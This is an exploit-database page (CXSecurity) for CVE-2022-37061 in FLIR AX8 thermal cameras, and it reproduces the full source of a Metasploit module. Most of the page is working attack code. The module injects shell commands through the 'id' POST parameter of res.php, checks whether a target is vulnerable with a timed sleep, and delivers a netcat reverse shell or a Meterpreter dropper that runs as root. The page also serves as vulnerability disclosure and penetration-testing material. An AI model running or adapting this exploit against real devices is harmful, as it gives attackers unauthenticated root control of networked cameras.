---
title: FLIR AX8 1.46.16 Remote Command Injection meta
url: https://cxsecurity.com/issue/WLB-2022110002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-03
fetch_date: 2025-10-03T21:36:19.311906
---

# FLIR AX8 1.46.16 Remote Command Injection meta

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **FLIR AX8 1.46.16 Remote Command Injection meta** **2022.11.02**  Credit:  **[Samy Younsi](https://cxsecurity.com/author/Samy%2BYounsi/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/stopwatch'
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'FLIR AX8 unauthenticated RCE',
'Description' => %q{
All FLIR AX8 thermal sensor cameras versions up to and including 1.46.16 are vulnerable to Remote Command Injection.
This can be exploited to inject and execute arbitrary shell commands as the root user through the id HTTP POST parameter
in the res.php endpoint.
This module uses the vulnerability to upload and execute payloads gaining root privileges.
},
'License' => MSF\_LICENSE,
'Author' => [
'Thomas Knudsen (https://www.linkedin.com/in/thomasjknudsen)', # Security researcher
'Samy Younsi (https://www.linkedin.com/in/samy-younsi)', # Security researcher
'h00die-gr3y' # metasploit module
],
'References' => [
['CVE', '2022-37061'],
['PACKETSTORM', '168114'],
['URL', 'https://attackerkb.com/topics/UAZaDsQBfx/cve-2022-37061'],
],
'DisclosureDate' => '2022-08-19',
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH\_CMD, ARCH\_ARMLE],
'Privileged' => true,
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/reverse\_netcat'
}
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_ARMLE],
'Type' => :linux\_dropper,
'CmdStagerFlavor' => [ 'curl', 'printf' ],
'DefaultOptions' => {
'PAYLOAD' => 'linux/armle/meterpreter\_reverse\_tcp'
}
}
]
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 80,
'SSL' => false
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
end
def execute\_command(cmd, \_opts = {})
action\_id = rand(1..40)
return send\_request\_cgi({
'method' => 'POST',
'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',
'uri' => normalize\_uri(target\_uri.path, 'res.php'),
'vars\_post' => {
'action' => 'alarm',
'id' => "#{action\_id};#{cmd}"
}
})
rescue StandardError => e
elog("#{peer} - Communication error occurred: #{e.message}", error: e)
print\_error("Communication error occurred: #{e.message}")
return nil
end
# Checking if the target is vulnerable by executing a randomized sleep to test the remote code execution
def check
print\_status("Checking if #{peer} can be exploited!")
sleep\_time = rand(5..10)
print\_status("Performing command injection test issuing a sleep command of #{sleep\_time} seconds.")
res, elapsed\_time = Rex::Stopwatch.elapsed\_time do
execute\_command("sleep #{sleep\_time}")
end
return Exploit::CheckCode::Unknown('No response received from the target!') unless res
print\_status("Elapsed time: #{elapsed\_time} seconds.")
return CheckCode::Safe('Failed to test command injection.') unless elapsed\_time >= sleep\_time
CheckCode::Vulnerable('Successfully tested command injection.')
end
def exploit
case target['Type']
when :unix\_cmd
print\_status("Executing #{target.name} with #{payload.encoded}")
execute\_command(payload.encoded)
when :linux\_dropper
print\_status("Executing #{target.name}")
execute\_cmdstager
end
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top